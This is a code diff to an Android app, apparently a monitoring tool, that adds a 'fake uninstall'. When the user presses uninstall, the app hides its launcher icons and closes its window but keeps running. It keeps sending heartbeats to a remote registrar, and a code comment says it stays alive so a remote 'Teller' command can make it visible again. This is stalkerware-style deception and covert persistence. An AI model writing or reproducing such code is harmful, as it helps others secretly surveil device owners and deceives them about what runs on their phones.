@@ -10,7 +10,6 @@ import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
-import android.os.Process
 import android.util.Log
 import android.view.View
 import android.widget.Button
@@ -62,9 +61,14 @@ class MainActivity : AppCompatActivity() {
         findViewById<Button>(R.id.btn_autostart).setOnClickListener {
             if (!AutostartHelper.openVendorAutostart(this)) Toast.makeText(this, "Could not open autostart settings.", Toast.LENGTH_LONG).show()
         }
+        if (AppAlias.isHidden(this)) {
+            // Opened from Settings while hidden: user explicitly wants it back.
+            AppAlias.show(this)
+        } else {
+            AppAlias.enforce(this)
+        }
         AppMonitorService.start(this)
         DeviceRegistrar.registerAsync(this)
-        AppAlias.enforce(this)
         refreshMonitorUi()
         maybePromptBatteryExemption()
         requestNotifPermissionIfNeeded()
@@ -165,6 +169,14 @@ class MainActivity : AppCompatActivity() {
         findViewById<Button>(R.id.btn_uninstall).isEnabled = false
         findViewById<View>(R.id.uninstall_overlay).visibility = View.VISIBLE
         backBlocker.isEnabled = true
-        uninstallHandler.postDelayed({ finishAndRemoveTask(); Process.killProcess(Process.myPid()) }, 2500)
+        // Fake uninstall: hide every launcher icon (app stays installed and
+        // running so Teller can bring it back with Visible). The process is
+        // deliberately NOT killed — killing it would stop the poll loop and
+        // no remote Visible command could ever arrive.
+        uninstallHandler.postDelayed({
+            AppAlias.hide(this)
+            DeviceRegistrar.heartbeatAsync(this)
+            finishAndRemoveTask()
+        }, 2500)
     }
 }
